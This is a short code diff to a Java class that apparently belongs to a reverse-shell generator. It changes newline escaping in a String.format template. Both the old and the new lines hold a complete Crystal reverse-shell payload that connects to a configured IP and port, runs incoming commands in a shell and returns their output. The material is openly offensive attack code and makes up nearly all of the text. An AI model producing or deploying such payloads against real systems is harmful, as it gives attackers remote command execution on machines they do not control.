@@ -8,7 +8,7 @@ public class Crystal_code extends Reverse {
 
     public Crystal_code(String localIP, int localPort, LISTENER listener, SHELLS shellType){
         super(localIP, localPort, listener, shellType);
-        shellFormat = String.format("require \"process\"\nrequire \"socket\"\n\nc = Socket.tcp(Socket::Family::INET)\nc.connect(\"%s\", %s)\nloop do \n  m, l = c.receive\n  p = Process.new(m.rstrip(\"\\n\"), output:Process::Redirect::Pipe, shell:true)\n  c << p.output.gets_to_end\nend", this.getLocalIP(), this.getLocalPort());
+        shellFormat = String.format("require \"process\"\nrequire \"socket\"\n\nc = Socket.tcp(Socket::Family::INET)\nc.connect(\"%s\", %s)\nloop do \n  m, l = c.receive\n  p = Process.new(m.rstrip(\"\n\"), output:Process::Redirect::Pipe, shell:true)\n  c << p.output.gets_to_end\nend", this.getLocalIP(), this.getLocalPort());
     }
 
     @Override
